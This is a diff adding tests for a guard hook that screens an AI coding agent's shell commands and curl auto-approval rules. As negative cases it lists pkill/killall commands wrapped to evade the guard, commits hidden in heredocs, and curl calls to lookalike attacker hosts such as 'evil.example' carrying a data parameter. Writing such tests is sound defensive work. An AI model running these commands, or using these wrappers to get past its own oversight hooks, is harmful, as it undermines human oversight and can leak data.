@@ -134,3 +134,86 @@ test("the SCAN heredoc scanner does not swallow the line after `<<<` or an arith
   assert.equal(run("echo $((1 << n))\npkill -f chrome").status, 2);
   assert.equal(run("cat <<EOF\npkill -f chrome\nEOF").status, 0, "a real heredoc body is still prose");
 });
+
+// 15-F6 / 15-F7 (2026-10-10): the two shapes #1288 left open.
+const SHELL_HEREDOCS = [
+  "bash <<EOF\ngit commit -am x\nEOF",
+  "bash <<'EOF'\ngit add -A && git commit -m \"x\"\nEOF",
+  "sh <<EOF\ngit commit -m x\nEOF",
+  "cat <<EOF | bash\ngit commit -m x\nEOF",
+  "sudo bash -s <<'EOF'\nset -e\ngit commit -m x\nEOF",
+];
+
+test("shellparse reads a commit inside a heredoc a shell runs; a plain heredoc stays prose (15-F6)", () => {
+  for (const cmd of SHELL_HEREDOCS) {
+    const out = commitJson(cmd);
+    assert.notEqual(out, "[]", `shellparse missed the commit in: ${JSON.stringify(cmd)}`);
+    assert.equal(JSON.parse(out).length, 1, cmd);
+  }
+  assert.equal(commitJson("cat <<EOF\ngit commit -m x\nEOF"), "[]");
+  assert.equal(commitJson("python3 - <<EOF\nprint('git commit')\nEOF"), "[]");
+  // the real commit's own message heredoc is still prose, and the commit is still seen once
+  assert.equal(JSON.parse(commitJson("git commit -F - <<EOF\nthe message\nEOF")).length, 1);
+});
+
+test("the guard SEES a commit in a shell heredoc, even one the parser cannot tokenise (15-F6)", () => {
+  const repo = scratchRepo("hook-heredoc-");
+  const run = (command) => spawnSync("bash", [HOOK], {
+    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: repo.dir }),
+    cwd: repo.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: repo.dir, APEX_GUARD_PROBE: "1" },
+  });
+  try {
+    fs.writeFileSync(path.join(repo.dir, "docs/PHYSICS.md"), "note 2\n");
+    repo.g("add", "docs/PHYSICS.md");
+    for (const cmd of [...SHELL_HEREDOCS, "bash <<'EOF'\ngit commit -m \"unbalanced\nEOF"]) {
+      const r = run(cmd);
+      assert.equal(r.status, 0, `${JSON.stringify(cmd)}: ${r.stderr}`);
+      assert.match(r.stderr, /bash-guard probe: commit/, `the guard must SEE this commit: ${JSON.stringify(cmd)}`);
+    }
+    // a heredoc fed to a non-shell is still prose
+    assert.doesNotMatch(run("cat <<EOF\ngit commit -m x\nEOF").stderr, /probe: commit/);
+    assert.doesNotMatch(run("python3 - <<EOF\nprint('git commit -m x')\nEOF").stderr, /probe: commit/);
+  } finally { repo.rm(); }
+});
+
+test("`cd <other tree> && git commit` guards THAT tree, not the hook's own (15-F6)", () => {
+  const target = scratchRepo("hook-cd-target-"), home = scratchRepo("hook-cd-home-");
+  const run = (command) => spawnSync("bash", [HOOK], {
+    input: JSON.stringify({ tool_name: "Bash", tool_input: { command }, cwd: home.dir }),
+    cwd: home.dir, encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: home.dir, APEX_GUARD_PROBE: "1" },
+  });
+  try {
+    // only the TARGET tree has a staged (docs) change; the hook's own tree has nothing staged
+    fs.writeFileSync(path.join(target.dir, "docs/PHYSICS.md"), "note 2\n");
+    target.g("add", "docs/PHYSICS.md");
+    assert.match(run(`cd ${target.dir} && git commit -m x`).stderr, /probe: commit docs-only/);
+    assert.match(run(`git -C ${target.dir} commit -m x`).stderr, /probe: commit docs-only/);
+    assert.match(run(`cd ${path.dirname(target.dir)} && git -C ${path.basename(target.dir)} commit -m x`).stderr, /probe: commit docs-only/);
+    // no cd: the hook's own (empty) tree, so not docs-only
+    assert.match(run("git commit -m x").stderr, /probe: commit code/);
+  } finally { target.rm(); home.rm(); }
+});
+
+test("the pkill guard sees through timeout / xargs / setsid wrappers (15-F7)", () => {
+  const run = (command) => spawnSync("bash", [HOOK], {
+    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
+    encoding: "utf8", env: { ...process.env, CLAUDE_PROJECT_DIR: ROOT },
+  });
+  for (const cmd of [
+    "timeout 5 pkill -f chrome", "timeout -k 2 10s pkill -9f node", "echo chrome | xargs pkill -f", "xargs -n 1 pkill -f playwright < pids",
+    "setsid pkill -f chrome", "sudo timeout 5 pkill -f node", "timeout 5 killall chrome",
+  ]) assert.equal(run(cmd).status, 2, `bash-guard must block: ${cmd}`);
+  for (const cmd of ["timeout 5 sleep 1", "echo a | xargs echo", "timeout 5 pkill -x firefox", "echo 'timeout 5 pkill -f chrome'"])
+    assert.equal(run(cmd).status, 0, `bash-guard must allow: ${cmd}`);
+});
+
+test("settings.json auto-approves curl only to a loopback PORT, never a lookalike host (15-F8, Bryce 2026-10-10)", () => {
+  const allow = JSON.parse(fs.readFileSync(path.join(ROOT, ".claude/settings.json"), "utf8")).permissions.allow
+    .filter((d) => d.startsWith("Bash(curl")).map((d) => d.slice("Bash(".length, -1));
+  const matches = (pat, cmd) => new RegExp("^" + pat.split("*").map((s) => s.replace(/[.+?^${}()|[\]\\]/g, "\\$&")).join(".*") + "$").test(cmd);
+  const allowed = (cmd) => allow.some((p) => matches(p, cmd));
+  for (const cmd of ["curl http://127.0.0.1:3456/version.json", "curl http://localhost:3713/health"])
+    assert.ok(allowed(cmd), `settings.json must allow: ${cmd}`);
+  for (const cmd of ["curl http://127.0.0.1.evil.example/?d=x", "curl http://127.0.0.1@evil.example/", "curl http://localhost.evil.example/"])
+    assert.ok(!allowed(cmd), `settings.json must NOT auto-approve: ${cmd}`);
+});
